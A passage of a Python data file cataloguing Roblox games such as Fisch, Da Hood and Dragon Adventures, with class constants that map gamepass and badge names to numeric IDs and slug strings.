        Advanced25K        = 'Advanced (25K)',         470805405292091,  'Advanced_25K'
        Expert100K         = 'Expert (100K)',          3118039627796133, 'Expert_100K'
        ExtremeBubbler500K = 'Extreme Bubbler (500K)', 2718129323670663, 'Extreme_Bubbler_500K'
        EliteBubbler1M     = 'Elite Bubbler (1M)',     1596637791422828, 'Elite_Bubbler_1M'
        GumSpecialist10M   = 'Gum Specialist (10M)',   1504133711887303, 'Gum_Specialist_10M'
        BubbleGummer100M   = 'Bubble Gummer (100M)',   2113590115918140, 'Bubble_Gummer_100M'
        TheBestBubbler1B   = 'The Best Bubbler (1B)',  1138391338389053, 'The_Best_Bubbler_1B'
        BubbleKing5B       = 'Bubble King (5B)',       2893978931392677, 'Bubble_King_5B'
        Hatch100Eggs       = 'Hatch 100 Eggs',         3148356404260788, 'Hatch_100_Eggs'
        Hatch1000Eggs      = 'Hatch 1,000 Eggs',       1697379762708218, 'Hatch_1000_Eggs'
        Hatch10000Eggs     = 'Hatch 10,000 Eggs',      264494209383906,  'Hatch_10000_Eggs'
        Hatch100000Eggs    = 'Hatch 100,000 Eggs',     4447657895374809, 'Hatch_100000_Eggs'
        Hatch1000000Eggs   = 'Hatch 1,000,000 Eggs',   2118067099446539, 'Hatch_1000000_Eggs'
        # List Of Badges
        listOfBadges = [Welcome, Bubbler500, Starter2500, Advanced25K, Expert100K, ExtremeBubbler500K, EliteBubbler1M, GumSpecialist10M, BubbleGummer100M, TheBestBubbler1B, BubbleKing5B, Hatch100Eggs, Hatch1000Eggs, Hatch10000Eggs, Hatch100000Eggs, Hatch1000000Eggs]

class CreaturesofSonaria: # https://www.roblox.com/games/5233782396
    placeNames = 'Creatures of Sonaria', 'Creatures_of_Sonaria', 'CoS', 5233782396
    class Gamepasses:
        CorvuraxSpecies = 'Corvurax Species', 216724088, 'Corvurax_Species'
        # List Of Gamepasses
        listOfGamepasses = [CorvuraxSpecies]
    class Badges:
        CreaturesofSonariaTHEHATCH      = 'Creatures of Sonaria: THE HATCH',   3863179600038190, 'Creatures_of_Sonaria_THE_HATCH'
        BetaTester                      = 'Beta Tester',                       2124595590,       'Beta_Tester'
        BetaSupporter                   = 'Beta Supporter',                    2124595592,       'Beta_Supporter'
        Halloween2022                   = 'Halloween 2022',                    2129022315,       'Halloween_2022'
        Halloween2023                   = 'Halloween 2023',                    2153215846,       'Halloween_2023'
        Halloween2024                   = 'Halloween 2024',                    4462319084474111, 'Halloween_2024'
        Halloween2025                   = 'Halloween 2025',                    3260751634114528, 'Halloween_2025'
        Christmas2020                   = 'Christmas 2020',                    2124660417,       'Christmas_2020'
        Christmas2022                   = 'Christmas 2022',                    2129936623,       'Christmas_2022'
        Valentines2021                  = 'Valentines 2021',                   2124686302,       'Valentines_2021'
        Valentines2023                  = 'Valentines 2023',                   2140726547,       'Valentines_2023'
        Valentines2024                  = 'Valentines 2024',                   55658403086320,   'Valentines_2024'
        Valentines2025                  = 'Valentines 2025',                   8003417492984,    'Valentines_2025'
        Easter2023                      = 'Easter 2023',                       2143625119,       'Easter_2023'
        Easter2024                      = 'Easter 2024',                       1734098717984624, 'Easter_2024'
        Easter2025                      = 'Easter 2025',                       1675841494057005, 'Easter_2025'
        LandSeaSky2023                  = 'Land Sea Sky 2023',                 2145610041,       'Land_Sea_Sky_2023'
        LandSeaSky2024                  = 'Land Sea Sky 2024',                 2960167874826659, 'Land_Sea_Sky_2024'
        LandSeaSky2025                  = 'Land Sea Sky 2025',                 90884767978344,   'Land_Sea_Sky_2025'
        SummerParadise2023              = 'Summer Paradise 2023',              2149100257,       'Summer_Paradise_2023'
        SummerParadise2024              = 'Summer Paradise 2024',              1654242147814853, 'Summer_Paradise_2024'
        SummerParadise2025              = 'Summer Paradise 2025',              4135848726720838, 'Summer_Paradise_2025'
        Winter2023                      = 'Winter 2023',                       2661459542444321, 'Winter_2023'
        Winter2024                      = 'Winter 2024',                       2998142934210494, 'Winter_2024'
        SpringMeadows2024               = 'Spring Meadows 2024',               1040006371199126, 'Spring_Meadows_2024'
        SpringMeadows2025               = 'Spring Meadows 2025',               956526096696823,  'Spring_Meadows_2025'
        Disaster2024                    = 'Disaster 2024',                     1888520945881505, 'Disaster_2024'
        Disaster2025                    = 'Disaster 2025',                     3078297039018317, 'Disaster_2025'
        Lore2024                        = 'Lore 2024',                         4346068251661631, 'Lore_2024'
        Lore2025                        = 'Lore 2025',                         1365014430910710, 'Lore_2025'
        Harvest2024                     = 'Harvest 2024',                      1596996370838262, 'Harvest_2024'
        Amazon2024                      = 'Amazon 2024',                       2291949305789809, 'Amazon_2024'
        Fireworks2023                   = 'Fireworks 2023',                    2148143991,       'Fireworks_2023'
        Fireworks2024                   = 'Fireworks 2024',                    2566270751122609, 'Fireworks_2024'
        Fireworks2025                   = 'Fireworks 2025',                    1342436313329184, 'Fireworks_2025'
        TwentyOnePilotsEvent            = 'Twenty One Pilots Event',           2124810991,       'Twenty_One_Pilots_Event'
        RecodeEarlyAccess               = 'Recode Early Access',               2147582505,       'Recode_Early_Access'
        RecodeSupporterTitleAndCreature = 'Recode Supporter Title & Creature', 2147584013,       'Recode_Supporter_Title_And_Creature'
        TwinAtlasWinterClash            = 'Twin Atlas Winter Clash',           1964648519335747, 'Twin_Atlas_Winter_Clash'
        NINJAGOLegendsEvent             = 'NINJAGO Legends Event',             2521539978905021, 'NINJAGO_Legends_Event'
        MedalTVQuestCompletion          = 'MedalTV Quest Completion',          3536015251824551, 'MedalTV_Quest_Completion'
        MedalTVQuestCompletionWeek2     = 'MedalTV Quest Completion, Week 2',  3036475209269208, 'MedalTV_Quest_Completion_Week_2'
        # List Of Badges
        listOfBadges = [CreaturesofSonariaTHEHATCH, BetaTester, BetaSupporter, Halloween2022, Halloween2023, Halloween2024, Halloween2025, Christmas2020, Christmas2022, Valentines2021, Valentines2023, Valentines2024, Valentines2025, Easter2023, Easter2024, Easter2025, LandSeaSky2023, LandSeaSky2024, LandSeaSky2025, SummerParadise2023, SummerParadise2024, SummerParadise2025, Winter2023, Winter2024, SpringMeadows2024, SpringMeadows2025, Disaster2024, Disaster2025, Lore2024, Lore2025, Harvest2024, Amazon2024, Fireworks2023, Fireworks2024, Fireworks2025, TwentyOnePilotsEvent, RecodeEarlyAccess, RecodeSupporterTitleAndCreature, TwinAtlasWinterClash, NINJAGOLegendsEvent, MedalTVQuestCompletion, MedalTVQuestCompletionWeek2]

class DaHood: # https://www.roblox.com/games/2788229376
    placeNames = 'Da Hood', 'Da_Hood', 'DH', 2788229376
    class Gamepasses:
        Boombox               = 'Boombox',            6207330,    'Boombox'
        AnonymousCalls        = 'Anonymous Calls',    6072006,    'Anonymous_Calls'
        CustomRingtone        = 'Custom Ringtone',    6080836,    'Custom_Ringtone'
        AnimationPack         = 'Animation Pack',     6412475,    'Animation_Pack'
        AnimationPackPlusPlus = 'Animation Pack++',   106912041,  'Animation_PackPlusPlus'
        Flashlight            = 'Flashlight',         6673363,    'Flashlight'
        Knife                 = 'Knife',              6217663,    'Knife'
        Bat                   = 'Bat',                6407926,    'Bat'
        Shovel                = 'Shovel',             6813576,    'Shovel'
        Mask                  = 'Mask',               103232594,  'Mask'
        PepperSpray           = 'Pepper Spray',       6966816,    'Pepper_Spray'
        HouseLimitBoost       = 'House Limit Boost',  7130657,    'House_Limit_Boost'
        CustomCursor          = 'Custom Cursor',      106911810,  'Custom_Cursor'
        HairGlue              = 'Hair Glue',          916795141,  'Hair_Glue'
        VehicleLock           = 'Vehicle Lock',       1290098254, 'Vehicle_Lock'
        Undercoverofficer     = 'Undercover officer', 6394348,    'Undercover_officer'
        Pitchfork             = 'Pitchfork',          7232728,    'Pitchfork'
        Pencil                = 'Pencil',             79498592,   'Pencil'
        AimViewer             = 'Aim Viewer',         1133680367, 'Aim_Viewer'
        # List Of Gamepasses
        listOfGamepasses = [Boombox, AnonymousCalls, CustomRingtone, AnimationPack, AnimationPackPlusPlus, Flashlight, Knife, Bat, Shovel, Mask, PepperSpray, HouseLimitBoost, CustomCursor, HairGlue, VehicleLock, Undercoverofficer, Pitchfork, Pencil, AimViewer]

class DragonAdventures: # https://www.roblox.com/games/3475397644
    placeNames = 'Dragon Adventures', 'Dragon_Adventures', 'DA', 3475397644
    class Gamepasses:
        VIP              = 'VIP',               7010034,  'VIP'
        AdvancedBuilding = 'Advanced Building', 7578781,  'Advanced_Building'
        LuckyEgg         = 'Lucky Egg',         8510023,  'Lucky_Egg'
        ResourceHog      = 'Resource Hog',      8510024,  'Resource_Hog'
        BigBackpack      = 'Big Backpack',      8510025,  'Big_Backpack'
        LuckyTrainer     = 'Lucky Trainer',     8510026,  'Lucky_Trainer'
        LuckyTailor      = 'Lucky Tailor',      10999031, 'Lucky_Tailor'
        MultiRiding      = 'Multi-Riding',      9802010,  'Multi_Riding'
        MultiAccessory   = 'Multi-Accessory',   12000312, 'Multi_Accessory'
        # List Of Gamepasses
        listOfGamepasses = [VIP, AdvancedBuilding, LuckyEgg, ResourceHog, BigBackpack, LuckyTrainer, LuckyTailor, MultiRiding, MultiAccessory]
    class Badges:
        MetaDeveloper   = 'Met a Developer!',    2124634392,       'Met_a_Developer'
        RiyusTrustBadge = 'Riyu\'s Trust Badge', 530731637639832,  'Riyus_Trust_Badge'
        Winter2019      = 'Winter 2019',         2124564089,       'Winter_2019'
        Winter2021      = 'Winter 2021',         2124879418,       'Winter_2021'
        Christmas2022   = 'Christmas 2022',      2129850167,       'Christmas_2022'
        Winter2023      = 'Winter 2023',         1724546607470910, 'Winter_2023'
        Winter2024      = 'Winter 2024',         1680929594185010, 'Winter_2024'
        Valentines2020  = 'Valentines 2020',     2124564091,       'Valentines_2020'
        Valentines2022  = 'Valentines 2022',     2124928448,       'Valentines_2022'
        Valentines2023  = 'Valentines 2023',     2140856200,       'Valentines_2023'
        Valentines2024  = 'Valentines 2024',     2897784583321876, 'Valentines_2024'
        Valentines2025  = 'Valentines 2025',     3543596453313423, 'Valentines_2025'
        Halloween2019   = 'Halloween 2019',      2124564088,       'Halloween_2019'
        Halloween2020   = 'Halloween 2020',      2124622292,       'Halloween_2020'
        Halloween2021   = 'Halloween 2021',      2124843641,       'Halloween_2021'
        Halloween2022   = 'Halloween 2022',      2129053839,       'Halloween_2022'
        Halloween2023   = 'Halloween 2023',      2153596435,       'Halloween_2023'
        Halloween2024   = 'Halloween 2024',      778861698160847,  'Halloween_2024'
        Halloween2025   = 'Halloween 2025',      795755868351989,  'Halloween_2025'
        Easter2020      = 'Easter 2020',         2124564092,       'Easter_2020'
        Easter2021      = 'Easter 2021',         2124706777,       'Easter_2021'
        Easter2022      = 'Easter 2022',         2125832921,       'Easter_2022'
        Easter2023      = 'Easter 2023',         2143031781,       'Easter_2023'
        Easter2024      = 'Easter 2024',         3467626479412502, 'Easter_2024'
        Easter2025      = 'Easter 2025',         1570550551506460, 'Easter_2025'
        Solstice2020    = 'Solstice 2020',       2124564093,       'Solstice_2020'
        Solstice2021    = 'Solstice 2021',       2124583228,       'Solstice_2021'
        Solstice2022    = 'Solstice 2022',       2128140324,       'Solstice_2022'
        Solstice2023    = 'Solstice 2023',       2150313169,       'Solstice_2023'
        Solstice2024    = 'Solstice 2024',       1575651999109337, 'Solstice_2024'
        Solstice2025    = 'Solstice 2025',       1460647362033186, 'Solstice_2025'
        Galaxy2022      = 'Galaxy 2022',         2126825175,       'Galaxy_2022'
        Galaxy2023      = 'Galaxy 2023',         2147481065,       'Galaxy_2023'
        Galaxy2024      = 'Galaxy 2024',         2412831398413312, 'Galaxy_2024'
        Galaxy2025      = 'Galaxy 2025',         3448916649511144, 'Galaxy_2025'
        # List Of Badges
        listOfBadges = [MetaDeveloper, RiyusTrustBadge, Winter2019, Winter2021, Christmas2022, Winter2023, Winter2024, Valentines2020, Valentines2022, Valentines2023, Valentines2024, Valentines2025, Halloween2019, Halloween2020, Halloween2021, Halloween2022, Halloween2023, Halloween2024, Halloween2025, Easter2020, Easter2021, Easter2022, Easter2023, Easter2024, Easter2025, Solstice2020, Solstice2021, Solstice2022, Solstice2023, Solstice2024, Solstice2025, Galaxy2022, Galaxy2023, Galaxy2024, Galaxy2025]

class Fisch: # https://www.roblox.com/games/16732694052
    placeNames = 'Fisch', 'Fisch', 'Fi', 16732694052
    class Gamepasses:
        Radio             = 'Radio',               948629114,  'Radio'
        Supporter         = 'Supporter',           837478377,  'Supporter'
        AppraisersLuck    = 'Appraisers Luck',     837341519,  'Appraisers_Luck'
        DoubleXP          = 'Double XP',           837360470,  'Double_XP'
        EmotePack         = 'Emote Pack',          847012516,  'Emote_Pack'
        BobberPack        = 'Bobber Pack',         927437431,  'Bobber_Pack'
        SellAnywhere      = 'Sell Anywhere',       901839344,  'Sell_Anywhere'
        SpawnBoatAnywhere = 'Spawn Boat Anywhere', 986687236,  'Spawn_Boat_Anywhere'
        AppraiseAnywhere  = 'Appraise Anywhere',   986882975,  'Appraise_Anywhere'
        AquariumBoat      = 'Aquarium Boat',       1202313985, 'Aquarium_Boat'
        # List Of Gamepasses
        listOfGamepasses = [Radio, Supporter, AppraisersLuck, DoubleXP, EmotePack, BobberPack, SellAnywhere, SpawnBoatAnywhere, AppraiseAnywhere, AquariumBoat]
    class Badges:
        FirstTimeFischer            = 'First Time Fischer',               3713345851024569, 'First_Time_Fischer'
        SpecialSomeone              = 'Special Someone',                  2548603185740666, 'Special_Someone'
        EconomyExpert               = 'Economy Expert',                   4227551957813448, 'Economy_Expert'
        RareHunter                  = 'Rare Hunter',                      398396161277206,  'Rare_Hunter'
        KeepersPupil                = 'Keepers Pupil',                    292081433761936,  'Keepers_Pupil'
        AttemptedUpgrade            = 'Attempted Upgrade',                2087500307302023, 'Attempted_Upgrade'
        DivineRelic                 = 'Divine Relic',                     4469874271658702, 'Divine_Relic'
        Catches50                   = '50 Catches',                       3051769055311800, '50_Catches'
        Catches100                  = '100 Catches',                      980568772269520,  '100_Catches'
        Catches500                  = '500 Catches',                      2392322242811007, '500_Catches'
        Catches1000                 = '1000 Catches',                     2121501969748139, '1000_Catches'
        Catches2000                 = '2000 Catches',                     4043528816128290, '2000_Catches'
        Catches3000                 = '3000 Catches',                     2237691197864883, '3000_Catches'
        Catches4000                 = '4000 Catches',                     2586667227808420, '4000_Catches'
        Catches5000                 = '5000 Catches',                     2440764735271938, '5000_Catches'
        Catches10000                = '10,000 Catches',                   1009279661183813, '10000_Catches'
        LavaCaster                  = 'Lava Caster',                      1708816354589502, 'Lava_Caster'
        ReconExpert                 = 'Recon Expert',                     3526079295826418, 'Recon_Expert'
        TruePower                   = 'True Power',                       163992758707317,  'True_Power'
        ExperiencedTrueBeauty       = 'Experienced True Beauty',          553555175646641,  'Experienced_True_Beauty'
        BestiaryOcean               = 'Bestiary: Ocean',                  1045860405568363, 'Bestiary_Ocean'
        BestiaryMoosewood           = 'Bestiary: Moosewood',              3871316346306270, 'Bestiary_Moosewood'
        BestiaryRoslit              = 'Bestiary: Roslit',                 225841574756551,  'Bestiary_Roslit'
        BestiarySunstoneIsland      = 'Bestiary: Sunstone Island',        2903347774735091, 'Bestiary_Sunstone_Island'
        BestiaryTerrapinIsland      = 'Bestiary: Terrapin Island',        2994442057572213, 'Bestiary_Terrapin_Island'
        BestiaryRoslitVolcano       = 'Bestiary: Roslit Volcano',         4479912445209985, 'Bestiary_Roslit_Volcano'
        BestiaryVertigo             = 'Bestiary: Vertigo',                3200076862852988, 'Bestiary_Vertigo'
        BestiaryMushgroveSwamp      = 'Bestiary: Mushgrove Swamp',        4343979385420841, 'Bestiary_Mushgrove_Swamp'
        BestiarySnowcap             = 'Bestiary: Snowcap',                4101868524305507, 'Bestiary_Snowcap'
        BestiaryEverything          = 'Bestiary: Everything',             635398639427099,  'Bestiary_Everything'
        BestiaryKeepersAltar        = 'Bestiary: Keepers Altar',          772547227400435,  'Bestiary_Keepers_Altar'
        BestiaryDesolateDeep        = 'Bestiary: Desolate Deep',          3161443122784523, 'Bestiary_Desolate_Deep'
        BestiaryBrinePool           = 'Bestiary: Brine Pool',             1535329670769985, 'Bestiary_Brine_Pool'
        BestiaryForsakenShores      = 'Bestiary: Forsaken Shores',        3591399443042848, 'Bestiary_Forsaken_Shores'
        BestiaryTheDepths           = 'Bestiary: The Depths',             2042505003241970, 'Bestiary_The_Depths'
        BestiaryAncientArchives     = 'Bestiary: Ancient Archives',       1666493813690822, 'Bestiary_Ancient_Archives'
        BestiaryAncientIsle         = 'Bestiary: Ancient Isle',           2054807830474099, 'Bestiary_Ancient_Isle'
        BestiaryOvergrowthCaves     = 'Bestiary: Overgrowth Caves',       272078520028439,  'Bestiary_Overgrowth_Caves'
        BestiaryFrigidCavern        = 'Bestiary: Frigid Cavern',          843774301770016,  'Bestiary_Frigid_Cavern'
        BestiaryCryogenicCanal      = 'Bestiary: Cryogenic Canal',        4189906956026791, 'Bestiary_Cryogenic_Canal'
        BestiaryGlacialGrotto       = 'Bestiary: Glacial Grotto',         1396071619017862, 'Bestiary_Glacial_Grotto'
        BestiaryGrandReef           = 'Bestiary: Grand Reef',             968483808853747,  'Bestiary_Grand_Reef'
        BestiaryAtlanteanStorm      = 'Bestiary: Atlantean Storm',        32642745294476,   'Bestiary_Atlantean_Storm'
        BestiaryAtlantis            = 'Bestiary: Atlantis',               2070428894950149, 'Bestiary_Atlantis'
        BestiaryVolcanicVents       = 'Bestiary: Volcanic Vents',         2971899933109154, 'Bestiary_Volcanic_Vents'
        BestiaryChallengersDeep     = 'Bestiary: Challengers Deep',       2580846320562382, 'Bestiary_Challengers_Deep'
        BestiaryAbyssalZenith       = 'Bestiary: Abyssal Zenith',         440171660675783,  'Bestiary_Abyssal_Zenith'
        BestiaryCalmZone            = 'Bestiary: Calm Zone',              699973517072777,  'Bestiary_Calm_Zone'
        BestiaryVeiloftheForsaken   = 'Bestiary: Veil of the Forsaken',   434000111228886,  'Bestiary_Veil_of_the_Forsaken'
        BestiaryWaveborne           = 'Bestiary: Waveborne',              4035200905115276, 'Bestiary_Waveborne'
        BestiaryAzureLagoon         = 'Bestiary: Azure Lagoon',           2613933330373724, 'Bestiary_Azure_Lagoon'
        BestiaryIsleOfNewBeginnings = 'Bestiary: Isle Of New Beginnings', 62688893003566,   'Bestiary_Isle_Of_New_Beginnings'
        BestiaryLushgrove           = 'Bestiary: Lushgrove',              1997541657461197, 'Bestiary_Lushgrove'
        BestiaryEmberreach          = 'Bestiary: Emberreach',             2076076069924140, 'Bestiary_Emberreach'
        BestiaryTheCursedShores     = 'Bestiary: The Cursed Shores',      410506324603873,  'Bestiary_The_Cursed_Shores'
        BestiaryPineShoals          = 'Bestiary: Pine Shoals',            3256592958077820, 'Bestiary_Pine_Shoals'
        BestiaryOpenOcean           = 'Bestiary: Open Ocean',             279267787604757,  'Bestiary_Open_Ocean'
        BestiaryOctophant           = 'Bestiary: Octophant',              2020919067872646, 'Bestiary_Octophant'
        BestiaryAnimalsFirstSea     = 'Bestiary: Animals First Sea',      4460712899366124, 'Bestiary_Animals_First_Sea'
        BestiaryAnimalsSecondSea    = 'Bestiary: Animals Second Sea',     1444909653191652, 'Bestiary_Animals_Second_Sea'
        BestiaryBlueMoonFirstSea    = 'Bestiary: Blue Moon First Sea',    4358181133009953, 'Bestiary_Blue_Moon_First_Sea'
        BestiaryBlueMoonSecondSea   = 'Bestiary: Blue Moon Second Sea',   1132127671855113, 'Bestiary_Blue_Moon_Second_Sea'
        BestiaryLego                = 'Bestiary: Lego',                   507614698244930,  'Bestiary_Lego'
        BestiaryCarrotGarden        = 'Bestiary: Carrot Garden',          246796205450087,  'Bestiary_Carrot_Garden'
        ATripThroughSpace           = 'A Trip Through Space',             3824103730892525, 'A_Trip_Through_Space'
        SilentLullaby               = 'Silent Lullaby',                   1930105118522861, 'Silent_Lullaby'
        LEGOBackpack                = 'LEGO Backpack',                    1434830770922550, 'LEGO_Backpack'
        SharkFrenzy                 = 'Shark Frenzy',                     158854108363478,  'Shark_Frenzy'
        JurassicWorldFischQuest     = 'Jurassic World | Fisch Quest',     2790188123225486, 'Jurassic_World_Fisch_Quest'
        JurassicIslandBestiary      = 'Jurassic Island Bestiary',         385394182585789,  'Jurassic_Island_Bestiary'
        Unnamed                     = '?',                                1857933038828956, 'Unnamed'
        FischFright2024             = 'FISCHFRIGHT 2024',                 2594646182778359, 'Fisch_Fright_2024'
        RuneTier                    = 'Rune Tier',                        3562788701459850, 'Rune_Tier'
        KeyTier                     = 'Key Tier',                         2405124869714453, 'Key_Tier'
        # List Of Badges    
        listOfBadges = [FirstTimeFischer, SpecialSomeone, EconomyExpert, RareHunter, KeepersPupil, AttemptedUpgrade, DivineRelic, Catches50, Catches100, Catches500, Catches1000, Catches2000, Catches3000, Catches4000, Catches5000, Catches10000, LavaCaster, ReconExpert, TruePower, ExperiencedTrueBeauty, BestiaryOcean, BestiaryMoosewood, BestiaryRoslit, BestiarySunstoneIsland, BestiaryTerrapinIsland, BestiaryRoslitVolcano, BestiaryVertigo, BestiaryMushgroveSwamp, BestiarySnowcap, BestiaryEverything, BestiaryKeepersAltar, BestiaryDesolateDeep, BestiaryBrinePool, BestiaryForsakenShores, BestiaryTheDepths, BestiaryAncientArchives, BestiaryAncientIsle, BestiaryOvergrowthCaves, BestiaryFrigidCavern, BestiaryCryogenicCanal, BestiaryGlacialGrotto, BestiaryGrandReef, BestiaryAtlanteanStorm, BestiaryAtlantis, BestiaryVolcanicVents, BestiaryChallengersDeep, BestiaryAbyssalZenith, BestiaryCalmZone, BestiaryVeiloftheForsaken, BestiaryWaveborne, BestiaryAzureLagoon, BestiaryIsleOfNewBeginnings, BestiaryLushgrove, BestiaryEmberreach, BestiaryTheCursedShores, BestiaryPineShoals, BestiaryOpenOcean, BestiaryOctophant, BestiaryAnimalsFirstSea, BestiaryAnimalsSecondSea, BestiaryBlueMoonFirstSea, BestiaryBlueMoonSecondSea, BestiaryLego, BestiaryCarrotGarden, ATripThroughSpace, SilentLullaby, LEGOBackpack, SharkFrenzy, JurassicWorldFischQuest, JurassicIslandBestiary, Unnamed, FischFright2024, RuneTier, KeyTier]

class FiveNightsTD: # https://www.roblox.com/games/15846919378
    placeNames = 'Five Nights TD', 'Five_Nights_TD', 'FNTD', 15846919378
    class Gamepasses:
        VIP                       = 'VIP',                            755213386,  'VIP'
        ShinyHunter               = 'Shiny Hunter',                   970374466,  'Shiny_Hunter'
        StarterPackExclusiveTitle = 'Starter Pack & Exclusive Title', 1232238756, 'Starter_Pack_Exclusive_Title'
        # List Of Gamepasses
        listOfGamepasses = [VIP, ShinyHunter, StarterPackExclusiveTitle]
    class Badges:
        JoinTheGame                = 'Join The Game',                  450768915498982,  'Join_The_Game'
        WinaGame                   = 'Win a Game',                     3361299059765,    'Win_a_Game'
        CompleteGame1              = 'Complete Game 1',                1801557447657311, 'Complete_Game_1'
        CompleteGame2              = 'Complete Game 2',                660308672766666,  'Complete_Game_2'
        FinishGame3                = 'Finish Game 3',                  1249525436995984, 'Finish_Game_3'
        CompleteGame4              = 'Complete Game 4',                1352734224772502, 'Complete_Game_4'
        CompleteGame5              = 'Complete Game 5',                3840686186033460, 'Complete_Game_5'
        CompleteGame6              = 'Complete Game 6',                1289932523675224, 'Complete_Game_6'
        Completedgame7             = 'Completed game 7',               890542128167403,  'Completed_game_7'
        Completedgame8             = 'Completed game 8',               4360266057339738, 'Completed_game_8'
        CompletedGame10            = 'Completed Game 10',              1323923615523391, 'Completed_Game_10'
        TheARG1                    = 'The ARG 1',                      2308722040924793, 'The_ARG_1'
        ARG2Winner                 = 'ARG 2 Winner',                   4348953112147721, 'ARG_2_Winner'
        PlaySummerEvent            = 'Play Summer Event',              4093753784951799, 'Play_Summer_Event'
        CompleteSummerEvent        = 'Complete Summer Event',          4192377969805376, 'Complete_Summer_Event'
        PlayedSummerEvent2         = 'Played Summer Event 2',          2285050971452199, 'Played_Summer_Event_2'
        CompletedSummerEvent2      = 'Completed Summer Event 2',       1733505022543445, 'Completed_Summer_Event_2'
        PlayMilitaryEvent          = 'Play Military Event',            3717054685843370, 'Play_Military_Event'
        CompleteMilitaryEvent      = 'Complete Military Event',        1710710467179779, 'Complete_Military_Event'
        PlayWildWestEvent          = 'Play Wild West Event',           78638580451212,   'Play_WildWest_Event'
        FinishWildWest             = 'Finish Wild West',               4427897814216895, 'Finish_Wild_West'
        PlayHalloweenEvent         = 'Play Halloween Event',           481777508062526,  'Play_Halloween_Event'
        CompleteHalloweenEvent     = 'Complete Halloween Event',       314612341496152,  'Complete_Halloween_Event'
        PlayedSteampunkEvent       = 'Played Steampunk Event',         2794698248016894, 'Played_Steampunk_Event'
        CompletedSteampunkEvent    = 'Completed Steampunk Event',      4321640724737709, 'Completed_Steampunk_Event'
        PlayPrehistoricEvent       = 'Play Prehistoric Event',         1462238683858305, 'Play_Prehistoric_Event'
        CompletePrehistoricEvent   = 'Complete Prehistoric Event',     477734488413301,  'Complete_Prehistoric_Event'
        PlayedChristmasEvent       = 'Played Christmas Event!',        2924114884782147, 'Played_Christmas_Event'
        CompletedChristmasEvent    = 'Completed Christmas Event',      2486341879016297, 'Completed_Christmas_Event'
        FoolsHuntWinner            = 'Fools Hunt Winner',              1350170603923805, 'Fools_Hunt_Winner'
        ClaimCalenderSpecialReward = 'Claim Calender Special Reward',  3554984265461704, 'Claim_Calender_Special_Reward'
        # List Of Badges
        listOfBadges = [JoinTheGame, WinaGame, CompleteGame1, CompleteGame2, FinishGame3, CompleteGame4, CompleteGame5, CompleteGame6, Completedgame7, Completedgame8, CompletedGame10, TheARG1, ARG2Winner, PlaySummerEvent, CompleteSummerEvent, PlayedSummerEvent2, CompletedSummerEvent2, PlayMilitaryEvent, CompleteMilitaryEvent, PlayWildWestEvent, FinishWildWest, PlayHalloweenEvent, CompleteHalloweenEvent, PlayedSteampunkEvent, CompletedSteampunkEvent, PlayPrehistoricEvent, CompletePrehistoricEvent, PlayedChristmasEvent, CompletedChristmasEvent, FoolsHuntWinner, ClaimCalenderSpecialReward]

class Forsaken: # https://www.roblox.com/games/18687417158
    placeNames = 'Forsaken', 'Forsaken', 'Fo', 18687417158
    class Gamepasses:
        VIP                   = 'V.I.P',                   1009460688, 'VIP'
        x2Emotes              = '2x Emotes',               1167749181, '2x_Emotes'
        CameramanKillerAccess = 'Cameraman Killer Access', 1161513424, 'Cameraman_Killer_Access'
        ExtraEmoteWheel       = 'Extra Emote Wheel',       1167749181, 'Extra_Emote_Wheel'
        EarthDayPass          = 'Earth Day Pass',          1175324261, 'Earth_Day_Pass'
        # List Of Gamepasses
        listOfGamepasses = [VIP, x2Emotes, CameramanKillerAccess, ExtraEmoteWheel, EarthDayPass]
    class Badges:
        EternallyForsaken = 'Eternally Forsaken', 411480180016665, 'Eternally_Forsaken'
        # List Of Badges
        listOfBadges = [EternallyForsaken]

class GrandPieceOnline: # https://www.roblox.com/games/1730877806
    placeNames = 'Grand Piece Online', 'Grand_Piece_Online', 'GPO', 1730877806
    class Gamepasses:
        peppodonate        = 'peppo donate',          4795279,    'peppo_donate'
        testeraccess       = 'tester access',         8767755,    'tester_access'
        bari               = 'bari',                  11349062,   'bari'
        BPSeason1          = 'BP Season 1',           99823291,   'BP_Season_1'
        BPSeason2          = 'BP Season 2',           114432469,  'BP_Season_2'
        BPSeason3          = 'BP Season 3',           659418065,  'BP_Season_3'
        BPSeason4          = 'BP Season 4',           676823798,  'BP_Season_4'
        BPSeason5          = 'BP Season 5',           867616837,  'BP_Season_5'
        BPSeason6          = 'BP Season 6',           1010918687, 'BP_Season_6'
        BPSeason7          = 'BP Season 7',           1209942473, 'BP_Season_7'
        EmotePack1         = 'Emote Pack #1',         5233790,    'Emote_Pack_1'
        EmotePack2         = 'Emote Pack #2',         6360299,    'Emote_Pack_2'
        EmotePack3         = 'Emote Pack #3',         9247442,    'Emote_Pack_3'
        MemeEmotes         = 'Meme Emotes',           13465428,   'Meme_Emotes'
        MarineEmotes       = 'Marine Emotes',         13465435,   'Marine_Emotes'
        JojoEmotes         = 'Jojo Emotes',           13465461,   'Jojo_Emotes'
        FacePack1          = 'Face Pack #1',          11023931,   'Face_Pack_1'
        x2_Bank_Storage    = '2x Bank Storage',       9846094,    '2x_Bank_Storage'
        DevilFruitNotifier = 'Devil Fruit Notifier',  10535601,   'Devil_Fruit_Notifier'
        FruitBag           = 'Fruit Bag',             12776768,   'Fruit_Bag'
        Striker            = 'Striker',               12146732,   'Striker'
        CoffinBoat         = 'Coffin Boat',           10897748,   'Coffin_Boat'
        PrivateServers     = 'Private Servers',       12769541,   'Private_Servers'
        MusicSnail         = 'Music Snail',           13467111,   'Music_Snail'
        DrippyFit          = 'Drippy Fit',            14337840,   'Drippy_Fit'
        DungeonMapChooser  = 'Dungeon Map Chooser',   24351992,   'Dungeon_Map_Chooser'
        FastAutoRaceReroll = 'Fast Auto Race Reroll', 843435230,  'Fast_Auto_Race_Reroll'
        # List Of Gamepasses
        listOfGamepasses = [peppodonate, testeraccess, bari, BPSeason1, BPSeason2, BPSeason3, BPSeason4, BPSeason5, BPSeason6, BPSeason7, EmotePack1, EmotePack2, EmotePack3, MemeEmotes, MarineEmotes, JojoEmotes, FacePack1, x2_Bank_Storage, DevilFruitNotifier, FruitBag, Striker, CoffinBoat, PrivateServers, MusicSnail, DrippyFit, DungeonMapChooser, FastAutoRaceReroll]
    class Badges:
        early           = 'early',              2124538094,       'early'
        PaidAccessToken = 'Paid Access Token',  2124636610,       'Paid_Access_Token'
        CertifiedTrader = 'Certified Trader',   2124828978,       'Certified_Trader'
        ANewAdventure   = 'A New Adventure',    2127154256,       'A_New_Adventure'
        phoeyugate      = 'phoeyu gate',        2127585705,       'phoeyu_gate'
